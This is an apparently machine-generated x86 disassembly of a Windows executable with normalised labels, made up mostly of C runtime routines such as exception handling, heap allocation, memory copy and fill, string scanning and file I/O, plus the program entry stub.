push ebp
mov ebp esp
push ecx
push ebx
push esi
cmp [ ebp + 0xc ] 0x0
push edi
mov edi [ ebp + 0x8 ]
mov esi [ edi + 0xc ]
mov ebx [ edi + 0x10 ]
mov eax esi
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] eax
jl r-xdata
mov ecx [ ebp + 0x14 ]
inc esi
mov [ ecx ] esi
mov ecx [ ebp + 0x18 ]
mov [ ecx ] eax
cmp eax [ edi + 0xc ]
ja r-xdata
cmp esi 0xffffffff
jne r-xdata
call sub_40d7e2
cmp esi eax
jbe r-xdata
mov ecx [ ebp + 0x10 ]
dec esi
lea eax [ esi + esi * 4 ]
cmp [ ebx + eax * 4 + 0x4 ] ecx
lea eax [ ebx + eax * 4 ]
jge r-xdata
call sub_40d7e2
lea eax [ esi + esi * 4 ]
pop edi
pop esi
lea eax [ ebx + eax * 4 ]
pop ebx
leave
retn
cmp esi 0xffffffff
jne r-xdata
cmp ecx [ eax + 0x8 ]
jle r-xdata
cmp [ ebp + 0xc ] 0x0
jge r-xdata
mov eax [ ebp + 0x8 ]
dec [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov [ ebp + 0x8 ] esi
mov eax [ ebp - 0x4 ]
sub_40c184
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40c1c6
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push eax
push 0xfffffffe
push sub_40c1a4
push [ fs : 0x0 ]
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
cmp esi [ esp + 0x24 ]
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0x8 ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_40c25a
call [ ebx + esi * 4 + 0x8 ]
mov eax [ esp + 0x20 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_40c272
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x20 ] eax
lea eax [ ebp + 0x10 ]
mov [ ebp - 0x14 ] 0x42
push eax
lea eax [ ebp - 0x20 ]
push [ ebp + 0xc ]
mov [ ebp - 0x1c ] 0x7fffffff
push eax
call sub_40d94d
add esp 0xc
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x0
call sub_40d838
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
and [ eax ] 0x0
jmp r-xdata
mov eax esi
pop esi
leave
retn
sub_40c2c4
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0x0
push ebx
jne r-xdata
mov ebx [ ebp + 0x8 ]
cmp ebx 0x100
jge r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x61
jl r-xdata
mov edx [ rw-data ]
mov eax ebx
sar eax 0x8
movzx ecx al
test [ edx + ecx * 2 + 0x1 ] 0x80
je r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
pop ebx
leave
retn
cmp eax 0x7a
jg r-xdata
and [ ebp + 0x9 ] 0x0
mov [ ebp + 0x8 ] bl
push 0x1
and [ ebp + 0xa ] 0x0
mov [ ebp + 0x8 ] al
mov [ ebp + 0x9 ] bl
push 0x2
jmp r-xdata
mov eax [ rw-data ]
mov al [ eax + ebx * 2 ]
and eax 0x2
push 0x2
push ebx
call sub_40e3a6
pop ecx
pop ecx
jmp r-xdata
sub eax 0x20
jmp r-xdata
mov eax ebx
jmp r-xdata
cmp eax 0x1
jne r-xdata
pop eax
lea ecx [ ebp - 0x4 ]
push 0x1
push 0x0
push 0x3
push ecx
push eax
lea eax [ ebp + 0x8 ]
push eax
push 0x200
push [ rw-data ]
call sub_40e157
add esp 0x20
test eax eax
je r-xdata
test eax eax
jne r-xdata
movzx eax [ ebp - 0x3 ]
movzx ecx [ ebp - 0x4 ]
shl eax 0x8
or eax ecx
movzx eax [ ebp - 0x4 ]
jmp r-xdata
sub_40c390
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
xor eax eax
or ecx 0xffffffff
[ edi ]
inc ecx
neg ecx
dec edi
mov al [ ebp + 0xc ]
std
[ edi ]
inc edi
cmp [ edi ] al
je r-xdata
mov eax edi
xor eax eax
jmp r-xdata
cld
pop edi
leave
retn
sub_40c3b7
push esi
mov esi [ esp + 0x8 ]
push edi
or edi 0xffffffff
mov eax [ esi + 0xc ]
test al 0x40
je r-xdata
test al 0x83
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax edi
push esi
call sub_40e534
push esi
mov edi eax
call sub_40e4ce
push [ esi + 0x10 ]
call sub_40e41b
add esp 0xc
test eax eax
jge r-xdata
and [ esi + 0xc ] 0x0
pop edi
pop esi
retn
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
or edi 0xffffffff
jmp r-xdata
push eax
call sub_40c7f4
and [ esi + 0x1c ] 0x0
pop ecx
sub_40c40d
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
imul edi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
mov ecx edi
test edi edi
mov [ ebp - 0x4 ] edi
mov [ ebp + 0x8 ] ecx
jne r-xdata
mov esi [ ebp + 0x14 ]
test [ esi + 0xc ] 0x10c
je r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x14 ] 0x1000
jmp r-xdata
mov eax [ esi + 0x18 ]
mov [ ebp + 0x14 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
test [ esi + 0xc ] 0x10c
je r-xdata
cmp ecx [ ebp + 0x14 ]
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push esi
call sub_40e606
cmp eax 0xffffffff
pop ecx
je r-xdata
cmp [ ebp + 0x14 ] 0x0
mov eax ecx
je r-xdata
cmp ecx eax
mov edi ecx
jb r-xdata
mov eax edi
xor edx edx
sub eax [ ebp + 0x8 ]
div [ ebp + 0xc ]
jmp r-xdata
mov [ ebx ] al
mov eax [ esi + 0x18 ]
inc ebx
dec [ ebp + 0x8 ]
mov [ ebp + 0x14 ] eax
push eax
push ebx
push [ esi + 0x10 ]
call sub_40e6df
add esp 0xc
test eax eax
je r-xdata
xor edx edx
div [ ebp + 0x14 ]
mov eax ecx
sub eax edx
push edi
push [ esi ]
push ebx
call sub_40cb30
sub [ ebp + 0x8 ] edi
sub [ esi + 0x4 ] edi
add [ esi ] edi
add esp 0xc
add ebx edi
mov edi [ ebp - 0x4 ]
jmp r-xdata
mov edi eax
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
or [ esi + 0xc ] 0x10
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
or [ esi + 0xc ] 0x20
sub [ ebp + 0x8 ] eax
add ebx eax
jmp r-xdata
sub_40c528
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
imul edi [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] edi
test edi edi
mov [ ebp + 0x8 ] eax
mov ebx edi
jne r-xdata
mov esi [ ebp + 0x14 ]
test [ esi + 0xc ] 0x10c
je r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x14 ] 0x1000
mov eax [ esi + 0x18 ]
mov [ ebp + 0x14 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp ebx [ ebp + 0x14 ]
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
and ecx 0x108
je r-xdata
mov eax [ ebp + 0x8 ]
push esi
movsx eax [ eax ]
push eax
call sub_40d838
pop ecx
cmp eax 0xffffffff
pop ecx
je r-xdata
test ecx ecx
je r-xdata
cmp ebx eax
mov edi ebx
jb r-xdata
mov eax edi
inc [ ebp + 0x8 ]
mov eax [ esi + 0x18 ]
dec ebx
mov [ ebp + 0x14 ] eax
test eax eax
jg r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
push esi
call sub_40e534
test eax eax
pop ecx
jne r-xdata
push edi
push [ ebp + 0x8 ]
push [ esi ]
call sub_40cb30
sub [ esi + 0x4 ] edi
add [ esi ] edi
add esp 0xc
sub ebx edi
add [ ebp + 0x8 ] edi
jmp r-xdata
mov edi eax
test ebx ebx
jne r-xdata
mov [ ebp + 0x14 ] 0x1
mov edi ebx
mov eax ebx
xor edx edx
div [ ebp + 0x14 ]
mov edi ebx
sub edi edx
jmp r-xdata
mov edi [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x10 ]
or [ esi + 0xc ] 0x20
mov eax [ ebp - 0x4 ]
jmp r-xdata
add [ ebp + 0x8 ] eax
sub ebx eax
cmp eax edi
jb r-xdata
push edi
push [ ebp + 0x8 ]
push [ esi + 0x10 ]
call sub_40eabd
add esp 0xc
cmp eax 0xffffffff
je r-xdata
sub eax ebx
xor edx edx
div [ ebp + 0xc ]
jmp r-xdata
sub_40c650
xor eax eax
mov al [ esp + 0x8 ]
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
inc edx
cmp cl bl
je r-xdata
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_40c710
mov ecx [ esp + 0x8 ]
push edi
push ebx
push esi
mov dl [ ecx ]
mov edi [ esp + 0x10 ]
test dl dl
je r-xdata
mov eax edi
pop esi
pop ebx
pop edi
retn
mov dh [ ecx + 0x1 ]
test dh dh
je r-xdata
xor eax eax
pop esi
pop ebx
pop edi
mov al dl
jmp r-xdata
mov esi edi
mov ecx [ esp + 0x14 ]
mov al [ edi ]
inc esi
cmp al dl
je r-xdata
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
mov al [ esi ]
inc esi
cmp al dh
jne r-xdata
test al al
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
inc edx
cmp cl bl
je r-xdata
cmp al dl
je r-xdata
lea edi [ esi - 0x1 ]
pop esi
pop ebx
pop edi
xor eax eax
retn
mov al [ esi ]
inc esi
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
test al al
jne r-xdata
lea eax [ edi - 0x1 ]
pop esi
pop ebx
pop edi
retn
mov al [ esi ]
add esi 0x2
cmp al ah
jne r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
mov al [ ecx + 0x3 ]
test al al
je r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
mov ah [ esi - 0x1 ]
add ecx 0x2
cmp al ah
je r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
mov ah [ ecx + 0x2 ]
test ah ah
je r-xdata
jmp r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_40c790
push [ esp + 0x8 ]
push [ esp + 0x8 ]
call [ MoveFileA@IAT ]
test eax eax
jne r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
xor eax eax
retn
push eax
call sub_40ec6a
pop ecx
or eax 0xffffffff
retn
test eax eax
je r-xdata
sub_40c7c0
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_40c7f4
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
push esi
call sub_40ed4b
pop ecx
test eax eax
push esi
je r-xdata
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
push eax
call sub_40ed76
pop ecx
pop ecx
pop esi
retn
sub_40c835
cmp [ esp + 0x4 ] 0xffffffe0
ja r-xdata
xor eax eax
push [ esp + 0x4 ]
call sub_40c861
test eax eax
pop ecx
jne r-xdata
retn
cmp [ esp + 0x8 ] eax
je r-xdata
push [ esp + 0x4 ]
call sub_40f556
test eax eax
pop ecx
jne r-xdata
sub_40c861
push esi
mov esi [ esp + 0x8 ]
cmp esi [ rw-data ]
ja r-xdata
test esi esi
jne r-xdata
push esi
call sub_40f0a1
test eax eax
pop ecx
jne r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
push 0x1
pop esi
pop esi
retn
sub_40c8e8
push ebp
mov ebp esp
add esp 0xfffffff4
fwait
fnstcw [ ebp - 0x2 ]
fwait
mov ax [ ebp - 0x2 ]
or ah 0xc
mov [ ebp - 0x4 ] ax
fldcw [ ebp - 0x4 ]
fistp [ ebp - 0xc ]
fldcw [ ebp - 0x2 ]
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
leave
retn
sub_40c910
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
sub_40c940
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
lea eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
xor ebx ebx
mov edi edi
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp eax ebx
je r-xdata
or ebx ebx
je r-xdata
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
inc esi
inc edi
push ecx
push eax
push ebx
call sub_40fa25
mov ebx eax
add esp 0x4
call sub_40fa25
add esp 0x4
pop ecx
cmp eax ebx
jne r-xdata
mov ecx 0xffffffff
jb r-xdata
inc esi
inc edi
cmp ah bh
jb r-xdata
neg ecx
dec ecx
jne r-xdata
neg ecx
jmp r-xdata
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
mov al [ esi ]
or eax eax
mov bl [ edi ]
je r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
dec ecx
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x58
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
call [ GetVersion@IAT ]
xor edx edx
mov dl ah
mov [ rw-data ] edx
mov ecx eax
and ecx 0xff
mov [ rw-data ] ecx
shl ecx 0x8
add ecx edx
mov [ rw-data ] ecx
shr eax 0x10
mov [ rw-data ] eax
xor esi esi
push esi
call sub_40ecd1
pop ecx
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] esi
call sub_410206
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_4100d4
mov [ rw-data ] eax
call sub_40fe87
call sub_40fdce
call sub_40faf0
mov [ ebp - 0x30 ] esi
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
call sub_40fd76
mov [ ebp - 0x64 ] eax
test [ ebp - 0x30 ] 0x1
je r-xdata
push 0x1c
call sub_40cb08
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push [ ebp - 0x64 ]
push esi
push esi
call [ GetModuleHandleA@IAT ]
push eax
call sub_401000
mov [ ebp - 0x60 ] eax
push eax
call sub_40fb1d
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebp - 0x68 ] ecx
push eax
push ecx
call sub_40fbf2
pop ecx
pop ecx
retn
sub_40cb30
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
test edi 0x3
jne r-xdata
cmp edi eax
jb r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_40cb90 ]
jmp [ ecx * 4 + jump_table_40cc0c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40cc78 ]
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
inc esi
shr ecx 0x2
inc edi
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_40cc78 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
jmp [ ecx * 4 + jump_table_40ce10 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_40cd18 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40ce10 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40cc78 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40cc78 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40cc78 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
dec esi
shr ecx 0x2
dec edi
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_40ce10 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40ce10 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40ce10 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40ce10 ]
sub_40ce70
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
mov [ edi ] al
inc edi
dec edx
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
inc edi
dec ecx
jne r-xdata
sub_40cec8
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
imul esi [ esp + 0x14 ]
cmp esi 0xffffffe0
mov ebx esi
ja r-xdata
xor edi edi
cmp esi 0xffffffe0
ja r-xdata
test esi esi
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp ebx [ rw-data ]
ja r-xdata
add esi 0xf
and esi 0xfffffff0
push 0x1
pop esi
mov eax edi
push esi
call sub_40f556
test eax eax
pop ecx
je r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
push ebx
call sub_40f0a1
mov edi eax
pop ecx
test edi edi
jne r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
push ebx
push 0x0
push edi
call sub_40ce70
add esp 0xc
pop edi
pop esi
pop ebx
retn
sub_40cf45
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x18 ]
push edi
mov edi 0x19930520
cmp [ esi ] edi
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
je r-xdata
call sub_40d7e2
cmp [ esi + 0xc ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
push 0x1
pop eax
cmp [ eax ] 0xe06d7363
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_40cfe0
add esp 0x20
cmp [ eax + 0x14 ] edi
jbe r-xdata
push 0xffffffff
push esi
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_40d28c
add esp 0x10
jmp r-xdata
mov ecx [ eax + 0x1c ]
mov ecx [ ecx + 0x8 ]
test ecx ecx
je r-xdata
movzx edx [ ebp + 0x24 ]
push edx
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call ecx
add esp 0x20
jmp r-xdata
pop edi
pop esi
pop ebp
retn
sub_40cfe0
push ebp
mov ebp esp
sub esp 0x18
mov eax [ ebp + 0xc ]
and [ ebp - 0x14 ] 0x0
mov eax [ eax + 0x8 ]
cmp eax 0xffffffff
mov [ ebp - 0x10 ] eax
jl r-xdata
call sub_40d7e2
mov ecx [ ebp + 0x18 ]
cmp eax [ ecx + 0x4 ]
jl r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov ebx 0xe06d7363
push edi
mov edi 0x19930520
cmp [ esi ] ebx
jne r-xdata
jmp sub_40d78c
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x10 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_40d187
add esp 0x20
jmp r-xdata
cmp [ esi ] ebx
jne r-xdata
cmp [ esi + 0x14 ] edi
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp [ esi + 0x14 ] edi
jne r-xdata
mov esi [ rw-data ]
test esi esi
je r-xdata
mov edi [ ebp - 0x10 ]
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push edi
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
call sub_40c107
add esp 0x14
mov ebx eax
mov eax [ rw-data ]
push 0x1
push esi
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x14 ] 0x1
call sub_410684
pop ecx
test eax eax
pop ecx
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
cmp [ ebx ] edi
jg r-xdata
cmp [ esi ] ebx
jne r-xdata
call sub_40d7e2
push 0x1
push esi
call sub_40d6b5
pop ecx
pop ecx
inc [ ebp - 0x4 ]
add ebx 0x14
jmp r-xdata
cmp edi [ ebx + 0x4 ]
jg r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x18 ]
jae r-xdata
mov eax [ ebx + 0x10 ]
mov [ ebp + 0x8 ] eax
mov eax [ ebx + 0xc ]
test eax eax
mov [ ebp - 0xc ] eax
jle r-xdata
cmp [ esi + 0x14 ] edi
jne r-xdata
mov edi [ ebp - 0x10 ]
mov eax [ esi + 0x1c ]
mov eax [ eax + 0xc ]
lea edi [ eax + 0x4 ]
mov eax [ eax ]
test eax eax
mov [ ebp - 0x8 ] eax
jle r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
dec [ ebp - 0xc ]
